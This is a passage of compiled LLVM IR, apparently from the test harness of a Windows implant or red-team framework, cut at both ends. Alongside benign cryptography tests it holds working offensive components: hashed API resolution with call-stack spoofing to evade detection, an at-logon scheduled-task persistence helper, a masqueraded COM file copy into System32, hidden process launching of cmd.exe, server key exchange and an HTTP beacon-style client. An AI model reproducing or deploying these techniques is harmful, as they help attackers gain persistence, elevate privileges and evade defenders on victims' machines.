; ModuleID = '.\build\main.ll'
  %70 = call ptr (ptr, ...) @SpoofCall(ptr %69, ptr %68)
  %71 = ptrtoint ptr %70 to i32
  br label %if.end52

if.end52:                                         ; preds = %if.then47, %if.then45
  br label %if.end53

if.end53:                                         ; preds = %if.end52, %if.end37
  br label %do.cond

do.cond:                                          ; preds = %if.end53
  %72 = load i32, ptr %cond, align 4
  %tobool54 = icmp ne i32 %72, 0
  br i1 %tobool54, label %do.body, label %do.end, !llvm.loop !12

do.end:                                           ; preds = %do.cond, %if.then36, %if.then31, %if.then26, %if.then22, %if.then16, %if.then13, %if.then5, %if.then
  %73 = load ptr, ptr %FileOperation1, align 8
  %cmp55 = icmp ne ptr %73, null
  br i1 %cmp55, label %if.then56, label %if.end60

if.then56:                                        ; preds = %do.end
  %74 = load ptr, ptr %FileOperation1, align 8
  %lpVtbl57 = getelementptr inbounds %struct.IFileOperation, ptr %74, i32 0, i32 0
  %75 = load ptr, ptr %lpVtbl57, align 8
  %Release58 = getelementptr inbounds %struct.IFileOperationVtbl, ptr %75, i32 0, i32 2
  %76 = load ptr, ptr %Release58, align 8
  %77 = load ptr, ptr %FileOperation1, align 8
  %call59 = call i32 %76(ptr noundef %77)
  br label %if.end60

if.end60:                                         ; preds = %if.then56, %do.end
  %78 = load ptr, ptr %isrc, align 8
  %cmp61 = icmp ne ptr %78, null
  br i1 %cmp61, label %if.then62, label %if.end66

if.then62:                                        ; preds = %if.end60
  %79 = load ptr, ptr %isrc, align 8
  %lpVtbl63 = getelementptr inbounds %struct.IShellItem, ptr %79, i32 0, i32 0
  %80 = load ptr, ptr %lpVtbl63, align 8
  %Release64 = getelementptr inbounds %struct.IShellItemVtbl, ptr %80, i32 0, i32 2
  %81 = load ptr, ptr %Release64, align 8
  %82 = load ptr, ptr %isrc, align 8
  %call65 = call i32 %81(ptr noundef %82)
  br label %if.end66

if.end66:                                         ; preds = %if.then62, %if.end60
  %83 = load ptr, ptr %idst, align 8
  %cmp67 = icmp ne ptr %83, null
  br i1 %cmp67, label %if.then68, label %if.end72

if.then68:                                        ; preds = %if.end66
  %84 = load ptr, ptr %idst, align 8
  %lpVtbl69 = getelementptr inbounds %struct.IShellItem, ptr %84, i32 0, i32 0
  %85 = load ptr, ptr %lpVtbl69, align 8
  %Release70 = getelementptr inbounds %struct.IShellItemVtbl, ptr %85, i32 0, i32 2
  %86 = load ptr, ptr %Release70, align 8
  %87 = load ptr, ptr %idst, align 8
  %call71 = call i32 %86(ptr noundef %87)
  br label %if.end72

if.end72:                                         ; preds = %if.then68, %if.end66
  %88 = call ptr @GetProcAddressH(i32 2039415228, i32 1729367366)
  %89 = call ptr (ptr, ...) @SpoofCall(ptr %88)
  ret void
}

declare dllimport i32 @CoInitialize(ptr noundef) #1

declare dllimport i32 @CoCreateInstance(ptr noundef, ptr noundef, i32 noundef, ptr noundef, ptr noundef) #1

declare dllimport i32 @CoGetObject(ptr noundef, ptr noundef, ptr noundef, ptr noundef) #1

declare dllimport i32 @SHCreateItemFromParsingName(ptr noundef, ptr noundef, ptr noundef, ptr noundef) #1

declare dllimport void @CoUninitialize() #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test30() #0 {
entry:
  %pBuffer = alloca ptr, align 8
  %cbBuffer = alloca i32, align 4
  store ptr null, ptr %pBuffer, align 8
  store i32 0, ptr %cbBuffer, align 4
  %call = call ptr @ReadFromFile(ptr noundef @"??_C@_1DI@HBOPCIDN@?$AAC?$AA?3?$AA?2?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs?$AA?2?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA3?$AA2?$AA?2?$AAc?$AAm?$AAd?$AA?4?$AAe?$AAx?$AAe?$AA?$AA@", ptr noundef %cbBuffer)
  store ptr %call, ptr %pBuffer, align 8
  %0 = load i32, ptr %cbBuffer, align 4
  %1 = load ptr, ptr %pBuffer, align 8
  %call1 = call i32 @IeAddOnInstallMethod(ptr noundef %1, i32 noundef %0)
  %2 = load ptr, ptr %pBuffer, align 8
  call void @FreeAllocatedHeap(ptr noundef %2)
  ret void
}

declare dso_local ptr @ReadFromFile(ptr noundef, ptr noundef) #1

declare dso_local i32 @IeAddOnInstallMethod(ptr noundef, i32 noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test31() #0 {
entry:
  %List = alloca [6 x ptr], align 16
  %Result = alloca i32, align 4
  call void @MemCopy(ptr align 16 %List, ptr align 16 @__const.test31.List, i64 48, i1 false)
  store i32 0, ptr %Result, align 4
  %arraydecay = getelementptr inbounds [6 x ptr], ptr %List, i64 0, i64 0
  %call = call i32 @AreProcessesRunning(ptr noundef %arraydecay, i32 noundef 6, i32 noundef 0)
  store i32 %call, ptr %Result, align 4
  %0 = load i32, ptr %Result, align 4
  call void (ptr, ...) @PrintFormatW(ptr noundef @"??_C@_1BK@JIHKNHFA@?$AAR?$AAe?$AAs?$AAu?$AAl?$AAt?$AA?5?$AA?$DN?$AA?5?$AA?$CF?$AAd?$AA?6?$AA?$AA@", i32 noundef %0)
  ret void
}

declare dso_local i32 @AreProcessesRunning(ptr noundef, i32 noundef, i32 noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test32() #0 {
entry:
  %call = call i32 @CreateAtLogonTask(ptr noundef @"??_C@_19CDBMBMMD@?$AAC?$AAa?$AAl?$AAc?$AA?$AA@", ptr noundef @"??_C@_1DK@FHLOCEJC@?$AAC?$AA?3?$AA?2?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs?$AA?2?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA3?$AA2?$AA?2?$AAc?$AAa?$AAl?$AAc?$AA?4?$AAe?$AAx?$AAe?$AA?$AA@")
  ret void
}

declare dso_local i32 @CreateAtLogonTask(ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test33() #0 {
entry:
  %call = call i32 @MasqueradedMoveCopyDirectoryFileCOM(ptr noundef @"??_C@_1EC@PPCIEEKJ@?$AAC?$AA?3?$AA?2?$AAU?$AAs?$AAe?$AAr?$AAs?$AA?2?$AAA?$AAd?$AAm?$AAi?$AAn?$AA?2?$AAD?$AAe?$AAs?$AAk?$AAt?$AAo?$AAp?$AA?2?$AAi?$AAd?$AAa?$AA?4?$AAh?$AAe?$AAx?$AAl?$AAi@", ptr noundef @"??_C@_1CI@FIDDMMGM@?$AAC?$AA?3?$AA?2?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs?$AA?2?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA3?$AA2?$AA?$AA@", i32 noundef 0)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test34() #0 {
entry:
  %cnt.addr.i5 = alloca i64, align 8
  %ptr.addr.i6 = alloca ptr, align 8
  %vptr.i7 = alloca ptr, align 8
  %cnt.addr.i = alloca i64, align 8
  %ptr.addr.i = alloca ptr, align 8
  %vptr.i = alloca ptr, align 8
  %si = alloca %struct._STARTUPINFOW, align 8
  %pi = alloca %struct._PROCESS_INFORMATION, align 8
  store i64 104, ptr %cnt.addr.i5, align 8
  store ptr %si, ptr %ptr.addr.i6, align 8
  %0 = load ptr, ptr %ptr.addr.i6, align 8
  store ptr %0, ptr %vptr.i7, align 8
  %1 = load ptr, ptr %vptr.i7, align 8
  %2 = ptrtoint ptr %1 to i64
  %3 = load i64, ptr %cnt.addr.i5, align 8
  call void @MemSet(ptr align 1 %1, i8 0, i64 %3, i1 true)
  %4 = load ptr, ptr %ptr.addr.i6, align 8
  store i64 24, ptr %cnt.addr.i, align 8
  store ptr %pi, ptr %ptr.addr.i, align 8
  %5 = load ptr, ptr %ptr.addr.i, align 8
  store ptr %5, ptr %vptr.i, align 8
  %6 = load ptr, ptr %vptr.i, align 8
  %7 = ptrtoint ptr %6 to i64
  %8 = load i64, ptr %cnt.addr.i, align 8
  call void @MemSet(ptr align 1 %6, i8 0, i64 %8, i1 true)
  %9 = load ptr, ptr %ptr.addr.i, align 8
  %cb = getelementptr inbounds %struct._STARTUPINFOW, ptr %si, i32 0, i32 0
  store i32 104, ptr %cb, align 8
  %10 = call ptr @GetProcAddressH(i32 717748261, i32 -2087873110)
  %11 = call ptr (ptr, ...) @SpoofCall(ptr %10, ptr @"??_C@_1DI@HBOPCIDN@?$AAC?$AA?3?$AA?2?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs?$AA?2?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA3?$AA2?$AA?2?$AAc?$AAm?$AAd?$AA?4?$AAe?$AAx?$AAe?$AA?$AA@", ptr null, ptr null, ptr null, i32 1, i32 0, ptr null, ptr null, ptr %si, ptr %pi)
  %12 = ptrtoint ptr %11 to i32
  %hThread = getelementptr inbounds %struct._PROCESS_INFORMATION, ptr %pi, i32 0, i32 1
  %13 = load ptr, ptr %hThread, align 8
  %14 = call ptr @GetProcAddressH(i32 717748261, i32 -1406626251)
  %15 = call ptr (ptr, ...) @SpoofCall(ptr %14, ptr %13)
  %16 = ptrtoint ptr %15 to i32
  %hProcess = getelementptr inbounds %struct._PROCESS_INFORMATION, ptr %pi, i32 0, i32 0
  %17 = load ptr, ptr %hProcess, align 8
  %18 = call ptr @GetProcAddressH(i32 717748261, i32 -1406626251)
  %19 = call ptr (ptr, ...) @SpoofCall(ptr %18, ptr %17)
  %20 = ptrtoint ptr %19 to i32
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test35() #0 {
entry:
  %szRecipientPubKey = alloca [63 x i8], align 16
  %PrivateKey = alloca [75 x i8], align 16
  %PublicKey = alloca [63 x i8], align 16
  %pCipherText = alloca ptr, align 8
  %cbCipherText = alloca i32, align 4
  %PlainText = alloca [34 x i8], align 16
  call void @MemCopy(ptr align 16 %szRecipientPubKey, ptr align 16 @__const.test35.szRecipientPubKey, i64 63, i1 false)
  call void @MemCopy(ptr align 16 %PrivateKey, ptr align 16 @__const.test35.PrivateKey, i64 75, i1 false)
  call void @MemCopy(ptr align 16 %PublicKey, ptr align 16 @__const.test35.PublicKey, i64 63, i1 false)
  store ptr null, ptr %pCipherText, align 8
  store i32 0, ptr %cbCipherText, align 4
  call void @MemCopy(ptr align 16 %PlainText, ptr align 16 @__const.test35.PlainText, i64 34, i1 false)
  %arraydecay = getelementptr inbounds [34 x i8], ptr %PlainText, i64 0, i64 0
  %arraydecay1 = getelementptr inbounds [63 x i8], ptr %PublicKey, i64 0, i64 0
  %arraydecay2 = getelementptr inbounds [75 x i8], ptr %PrivateKey, i64 0, i64 0
  %arraydecay3 = getelementptr inbounds [63 x i8], ptr %szRecipientPubKey, i64 0, i64 0
  %call = call ptr @AgeKeyExToServer(ptr noundef %arraydecay3, ptr noundef %arraydecay2, ptr noundef %arraydecay1, ptr noundef %arraydecay, i32 noundef 34, ptr noundef %cbCipherText)
  store ptr %call, ptr %pCipherText, align 8
  %0 = load i32, ptr %cbCipherText, align 4
  %1 = load ptr, ptr %pCipherText, align 8
  call void @HexDump(ptr noundef %1, i32 noundef %0)
  %2 = load ptr, ptr %pCipherText, align 8
  call void @FreeAllocatedHeap(ptr noundef %2)
  ret void
}

declare dso_local ptr @AgeKeyExToServer(ptr noundef, ptr noundef, ptr noundef, ptr noundef, i32 noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test36() #0 {
entry:
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test37() #0 {
entry:
  %CipherText = alloca [158 x i8], align 16
  %lpOutput = alloca ptr, align 8
  call void @MemCopy(ptr align 16 %CipherText, ptr align 16 @__const.test37.CipherText, i64 158, i1 false)
  store ptr null, ptr %lpOutput, align 8
  %0 = load ptr, ptr %lpOutput, align 8
  call void (ptr, ...) @PrintFormatA(ptr noundef @"??_C@_03OFAPEBGM@?$CFs?6?$AA@", ptr noundef %0)
  %1 = load ptr, ptr %lpOutput, align 8
  call void @FreeAllocatedHeap(ptr noundef %1)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test38() #0 {
entry:
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test39() #0 {
entry:
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test40() #0 {
entry:
  %wszInput = alloca [350 x i8], align 16
  %pResult = alloca ptr, align 8
  %cbResult = alloca i32, align 4
  %i = alloca i32, align 4
  call void @MemCopy(ptr align 16 %wszInput, ptr align 16 @__const.test40.wszInput, i64 350, i1 false)
  store ptr null, ptr %pResult, align 8
  store i32 0, ptr %cbResult, align 4
  store i32 0, ptr %i, align 4
  %arraydecay = getelementptr inbounds [350 x i8], ptr %wszInput, i64 0, i64 0
  %call = call ptr @StrSplitNA(ptr noundef %arraydecay, ptr noundef @"??_C@_01MCMALHOG@a?$AA@", i32 noundef 0, ptr noundef %cbResult)
  store ptr %call, ptr %pResult, align 8
  %0 = load i32, ptr %cbResult, align 4
  call void (ptr, ...) @PrintFormatA(ptr noundef @"??_C@_0P@LOFDEAEB@cbResult?5?$DN?5?$CFd?6?$AA@", i32 noundef %0)
  store i32 0, ptr %i, align 4
  br label %for.cond

for.cond:                                         ; preds = %for.inc, %entry
  %1 = load i32, ptr %i, align 4
  %2 = load i32, ptr %cbResult, align 4
  %cmp = icmp ult i32 %1, %2
  br i1 %cmp, label %for.body, label %for.end

for.body:                                         ; preds = %for.cond
  %3 = load ptr, ptr %pResult, align 8
  %4 = load i32, ptr %i, align 4
  %idxprom = zext i32 %4 to i64
  %arrayidx = getelementptr inbounds ptr, ptr %3, i64 %idxprom
  %5 = load ptr, ptr %arrayidx, align 8
  call void (ptr, ...) @PrintFormatA(ptr noundef @"??_C@_03OFAPEBGM@?$CFs?6?$AA@", ptr noundef %5)
  br label %for.inc

for.inc:                                          ; preds = %for.body
  %6 = load i32, ptr %i, align 4
  %inc = add i32 %6, 1
  store i32 %inc, ptr %i, align 4
  br label %for.cond, !llvm.loop !13

for.end:                                          ; preds = %for.cond
  ret void
}

declare dso_local ptr @StrSplitNA(ptr noundef, ptr noundef, i32 noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test41() #0 {
entry:
  %szInpit = alloca [114 x i8], align 16
  %pResult = alloca ptr, align 8
  call void @MemCopy(ptr align 16 %szInpit, ptr align 16 @__const.test41.szInpit, i64 114, i1 false)
  store ptr null, ptr %pResult, align 8
  %arraydecay = getelementptr inbounds [114 x i8], ptr %szInpit, i64 0, i64 0
  %call = call ptr @DecodeMinisignPublicKey(ptr noundef %arraydecay)
  store ptr %call, ptr %pResult, align 8
  %0 = load ptr, ptr %pResult, align 8
  call void @HexDump(ptr noundef %0, i32 noundef 42)
  %1 = load ptr, ptr %pResult, align 8
  call void @FreeAllocatedHeap(ptr noundef %1)
  ret void
}

declare dso_local ptr @DecodeMinisignPublicKey(ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test42() #0 {
entry:
  %Data = alloca [14 x i8], align 1
  %pDigest = alloca ptr, align 8
  call void @MemCopy(ptr align 1 %Data, ptr align 1 @__const.test42.Data, i64 14, i1 false)
  store ptr null, ptr %pDigest, align 8
  %arraydecay = getelementptr inbounds [14 x i8], ptr %Data, i64 0, i64 0
  %0 = call ptr @GetProcAddressH(i32 717748261, i32 1398280933)
  %1 = call ptr (ptr, ...) @SpoofCall(ptr %0, ptr %arraydecay)
  %2 = ptrtoint ptr %1 to i32
  %arraydecay1 = getelementptr inbounds [14 x i8], ptr %Data, i64 0, i64 0
  %call2 = call ptr @Blake2B(ptr noundef %arraydecay1, i32 noundef %2, ptr noundef null, i32 noundef 0)
  store ptr %call2, ptr %pDigest, align 8
  %3 = load ptr, ptr %pDigest, align 8
  call void @HexDump(ptr noundef %3, i32 noundef 64)
  %4 = load ptr, ptr %pDigest, align 8
  call void @FreeAllocatedHeap(ptr noundef %4)
  ret void
}

declare dso_local ptr @Blake2B(ptr noundef, i32 noundef, ptr noundef, i32 noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test43() #0 {
entry:
  %Msg = alloca [86 x i8], align 16
  %PubKey = alloca [32 x i8], align 16
  %Signature = alloca [64 x i8], align 16
  %hMod = alloca ptr, align 8
  %ed25519_verify = alloca ptr, align 8
  call void @MemCopy(ptr align 16 %Msg, ptr align 16 @__const.test43.Msg, i64 86, i1 false)
  call void @MemCopy(ptr align 16 %PubKey, ptr align 16 @__const.test43.PubKey, i64 32, i1 false)
  call void @MemCopy(ptr align 16 %Signature, ptr align 16 @__const.test43.Signature, i64 64, i1 false)
  store ptr null, ptr %hMod, align 8
  store ptr null, ptr %ed25519_verify, align 8
  %arraydecay = getelementptr inbounds [32 x i8], ptr %PubKey, i64 0, i64 0
  %arraydecay1 = getelementptr inbounds [86 x i8], ptr %Msg, i64 0, i64 0
  %arraydecay2 = getelementptr inbounds [64 x i8], ptr %Signature, i64 0, i64 0
  %call = call i32 @ED25519Verify(ptr noundef %arraydecay2, ptr noundef %arraydecay1, i32 noundef 86, ptr noundef %arraydecay)
  %tobool = icmp ne i32 %call, 0
  br i1 %tobool, label %if.else, label %if.then

if.then:                                          ; preds = %entry
  call void (ptr, ...) @PrintFormatA(ptr noundef @"??_C@_06EJEJALKO@FALSE?6?$AA@")
  br label %if.end

if.else:                                          ; preds = %entry
  call void (ptr, ...) @PrintFormatA(ptr noundef @"??_C@_05OLJMNACH@TRUE?6?$AA@")
  br label %if.end

if.end:                                           ; preds = %if.else, %if.then
  ret void
}

declare dso_local i32 @ED25519Verify(ptr noundef, ptr noundef, i32 noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test44() #0 {
entry:
  %Msg = alloca [86 x i8], align 16
  %PubKey = alloca [32 x i8], align 16
  %Signature = alloca [64 x i8], align 16
  %hMod = alloca ptr, align 8
  %ed25519_verify = alloca ptr, align 8
  call void @MemCopy(ptr align 16 %Msg, ptr align 16 @__const.test44.Msg, i64 86, i1 false)
  call void @MemCopy(ptr align 16 %PubKey, ptr align 16 @__const.test44.PubKey, i64 32, i1 false)
  call void @MemCopy(ptr align 16 %Signature, ptr align 16 @__const.test44.Signature, i64 64, i1 false)
  store ptr null, ptr %hMod, align 8
  store ptr null, ptr %ed25519_verify, align 8
  %0 = call ptr @GetProcAddressH(i32 717748261, i32 1236282800)
  %1 = call ptr (ptr, ...) @SpoofCall(ptr %0, ptr @"??_C@_0P@OBLLLFIE@ed25519_64?4dll?$AA@")
  store ptr %1, ptr %hMod, align 8
  %2 = load ptr, ptr %hMod, align 8
  %3 = call ptr @GetProcAddressH(i32 717748261, i32 -1567767492)
  %4 = call ptr (ptr, ...) @SpoofCall(ptr %3, ptr %2, ptr @"??_C@_0P@FHMJICHK@ed25519_verify?$AA@")
  store ptr %4, ptr %ed25519_verify, align 8
  %5 = load ptr, ptr %ed25519_verify, align 8
  %arraydecay = getelementptr inbounds [32 x i8], ptr %PubKey, i64 0, i64 0
  %arraydecay2 = getelementptr inbounds [86 x i8], ptr %Msg, i64 0, i64 0
  %arraydecay3 = getelementptr inbounds [64 x i8], ptr %Signature, i64 0, i64 0
  %call4 = call i32 %5(ptr noundef %arraydecay3, ptr noundef %arraydecay2, i64 noundef 86, ptr noundef %arraydecay)
  %tobool = icmp ne i32 %call4, 0
  br i1 %tobool, label %if.else, label %if.then

if.then:                                          ; preds = %entry
  call void (ptr, ...) @PrintFormatA(ptr noundef @"??_C@_06EJEJALKO@FALSE?6?$AA@")
  br label %if.end

if.else:                                          ; preds = %entry
  call void (ptr, ...) @PrintFormatA(ptr noundef @"??_C@_05OLJMNACH@TRUE?6?$AA@")
  br label %if.end

if.end:                                           ; preds = %if.else, %if.then
  ret void
}

declare dllimport ptr @LoadLibraryA(ptr noundef) #1

declare dllimport ptr @GetProcAddress(ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test45() #0 {
entry:
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test46() #0 {
entry:
  %CipherText = alloca [82 x i8], align 16
  %Key = alloca [32 x i8], align 16
  %Nonce = alloca [12 x i8], align 1
  %pPlainText = alloca ptr, align 8
  call void @MemCopy(ptr align 16 %CipherText, ptr align 16 @__const.test46.CipherText, i64 82, i1 false)
  call void @MemCopy(ptr align 16 %Key, ptr align 16 @__const.test46.Key, i64 32, i1 false)
  call void @MemCopy(ptr align 1 %Nonce, ptr align 1 @__const.test46.Nonce, i64 12, i1 false)
  store ptr null, ptr %pPlainText, align 8
  %arraydecay = getelementptr inbounds [82 x i8], ptr %CipherText, i64 0, i64 0
  %arraydecay1 = getelementptr inbounds [12 x i8], ptr %Nonce, i64 0, i64 0
  %arraydecay2 = getelementptr inbounds [32 x i8], ptr %Key, i64 0, i64 0
  %call = call ptr @Chacha20Poly1305DecryptAndVerify(ptr noundef %arraydecay2, ptr noundef %arraydecay1, ptr noundef %arraydecay, i32 noundef 82, ptr noundef null, i32 noundef 0)
  store ptr %call, ptr %pPlainText, align 8
  %0 = load ptr, ptr %pPlainText, align 8
  %cbBuffer = getelementptr inbounds %struct._BUFFER, ptr %0, i32 0, i32 1
  %1 = load i32, ptr %cbBuffer, align 8
  %2 = load ptr, ptr %pPlainText, align 8
  %pBuffer = getelementptr inbounds %struct._BUFFER, ptr %2, i32 0, i32 0
  %3 = load ptr, ptr %pBuffer, align 8
  call void @HexDump(ptr noundef %3, i32 noundef %1)
  %4 = load ptr, ptr %pPlainText, align 8
  call void @FreeBuffer(ptr noundef %4)
  ret void
}

declare dso_local ptr @Chacha20Poly1305DecryptAndVerify(ptr noundef, ptr noundef, ptr noundef, i32 noundef, ptr noundef, i32 noundef) #1

declare dso_local void @FreeBuffer(ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test47() #0 {
entry:
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @test48() #0 {
entry:
  %cnt.addr.i = alloca i64, align 8
  %ptr.addr.i = alloca ptr, align 8
  %vptr.i = alloca ptr, align 8
  %pHttpClient = alloca ptr, align 8
  %HttpConfig = alloca %struct._HTTP_CONFIG, align 4
  %lpProxy = alloca ptr, align 8
  %pUri = alloca ptr, align 8
  %lpResp = alloca ptr, align 8
  %szUserAgent = alloca [117 x i8], align 16
  %pResp = alloca ptr, align 8
  store ptr null, ptr %pHttpClient, align 8
  store ptr null, ptr %lpProxy, align 8
  store ptr null, ptr %pUri, align 8
  store ptr null, ptr %lpResp, align 8
  call void @MemCopy(ptr align 16 %szUserAgent, ptr align 16 @__const.test48.szUserAgent, i64 117, i1 false)
  store ptr null, ptr %pResp, align 8
  store i64 460, ptr %cnt.addr.i, align 8
  store ptr %HttpConfig, ptr %ptr.addr.i, align 8
  %0 = load ptr, ptr %ptr.addr.i, align 8
  store ptr %0, ptr %vptr.i, align 8
  %1 = load ptr, ptr %vptr.i, align 8
  %2 = ptrtoint ptr %1 to i64
  %3 = load i64, ptr %cnt.addr.i, align 8
  call void @MemSet(ptr align 1 %1, i8 0, i64 %3, i1 true)
  %4 = load ptr, ptr %ptr.addr.i, align 8
  %arraydecay = getelementptr inbounds [117 x i8], ptr %szUserAgent, i64 0, i64 0
  %call1 = call ptr @DuplicateStrA(ptr noundef %arraydecay, i32 noundef 0)
  %lpUserAgent = getelementptr inbounds %struct._HTTP_CONFIG, ptr %HttpConfig, i32 0, i32 0
  store ptr %call1, ptr %lpUserAgent, align 4
  %call2 = call ptr @UriInit(ptr noundef @"??_C@_0BG@COPOONCH@https?3?1?1api?4seeip?4org?$AA@")
  store ptr %call2, ptr %pUri, align 8
  %5 = load ptr, ptr %pUri, align 8
  %cmp = icmp eq ptr %5, null
  br i1 %cmp, label %if.then, label %if.end

if.then:                                          ; preds = %entry
  br label %CLEANUP

if.end:                                           ; preds = %entry
  %dwNumberOfAttemps = getelementptr inbounds %struct._HTTP_CONFIG, ptr %HttpConfig, i32 0, i32 7
  store i32 10, ptr %dwNumberOfAttemps, align 4
  %6 = load ptr, ptr %pUri, align 8
  %call3 = call ptr @HttpClientInit(ptr noundef %6)
  store ptr %call3, ptr %pHttpClient, align 8
  %7 = load ptr, ptr %pHttpClient, align 8
  %call4 = call ptr @SendHttpRequest(ptr noundef %HttpConfig, ptr noundef %7, ptr noundef null, ptr noundef @"??_C@_03HAPOJHBM@GET?$AA@", ptr noundef null, ptr noundef null, i32 noundef 0, i32 noundef 0, i32 noundef 1)
  store ptr %call4, ptr %pResp, align 8
  %8 = load ptr, ptr %pResp, align 8
  %cmp5 = icmp eq ptr %8, null
  br i1 %cmp5, label %if.then6, label %if.end7

if.then6:                                         ; preds = %if.end
  br label %CLEANUP

if.end7:                                          ; preds = %if.end
  %9 = load ptr, ptr %pResp, align 8
  %cbResp = getelementptr inbounds %struct._HTTP_RESP, ptr %9, i32 0, i32 1
  %10 = load i32, ptr %cbResp, align 4
  %add = add i32 %10, 1
  %conv = zext i32 %add to i64
  %11 = call ptr @GetProcAddressH(i32 717748261, i32 -1441913739)
  %12 = call ptr (ptr, ...) @SpoofCall(ptr %11)
  %13 = call ptr @GetProcAddressH(i32 -2062442056, i32 -1934965594)
  %14 = call ptr (ptr, ...) @SpoofCall(ptr %13, ptr %12, i32 8, i64 %conv)
  store ptr %14, ptr %lpResp, align 8
  %15 = load ptr, ptr %lpResp, align 8
  %16 = load ptr, ptr %pResp, align 8
  %pRespData = getelementptr inbounds %struct._HTTP_RESP, ptr %16, i32 0, i32 0
  %17 = load ptr, ptr %pRespData, align 4
  %18 = load ptr, ptr %pResp, align 8
  %cbResp10 = getelementptr inbounds %struct._HTTP_RESP, ptr %18, i32 0, i32 1
  %19 = load i32, ptr %cbResp10, align 4
  %conv11 = zext i32 %19 to i64
  call void @MemCopy(ptr align 1 %15, ptr align 1 %17, i64 %conv11, i1 false)
  %20 = load ptr, ptr %lpResp, align 8
  call void (ptr, ...) @PrintFormatA(ptr noundef @"??_C@_0P@CFKDNGNA@Resp?5Data?3?5?$CFs?6?$AA@", ptr noundef %20)
  br label %CLEANUP

CLEANUP:                                          ; preds = %if.end7, %if.then6, %if.then
  %21 = load ptr, ptr %lpResp, align 8
  %cmp12 = icmp ne ptr %21, null
  br i1 %cmp12, label %if.then14, label %if.end15

if.then14:                                        ; preds = %CLEANUP
  %22 = load ptr, ptr %lpResp, align 8
  call void @FreeAllocatedHeap(ptr noundef %22)
  br label %if.end15

if.end15:                                         ; preds = %if.then14, %CLEANUP
  %23 = load ptr, ptr %lpProxy, align 8
  %cmp16 = icmp ne ptr %23, null
  br i1 %cmp16, label %if.then18, label %if.end19

if.then18:                                        ; preds = %if.end15
  %24 = load ptr, ptr %lpProxy, align 8
  call void @FreeAllocatedHeap(ptr noundef %24)
  br label %if.end19

if.end19:                                         ; preds = %if.then18, %if.end15
  %lpUserAgent20 = getelementptr inbounds %struct._HTTP_CONFIG, ptr %HttpConfig, i32 0, i32 0
  %25 = load ptr, ptr %lpUserAgent20, align 4
  %cmp21 = icmp ne ptr %25, null
  br i1 %cmp21, label %if.then23, label %if.end25

if.then23:                                        ; preds = %if.end19
  %lpUserAgent24 = getelementptr inbounds %struct._HTTP_CONFIG, ptr %HttpConfig, i32 0, i32 0
  %26 = load ptr, ptr %lpUserAgent24, align 4
  call void @FreeAllocatedHeap(ptr noundef %26)
  br label %if.end25

if.end25:                                         ; preds = %if.then23, %if.end19
  %27 = load ptr, ptr %pResp, align 8
  call void @FreeHttpResp(ptr noundef %27)
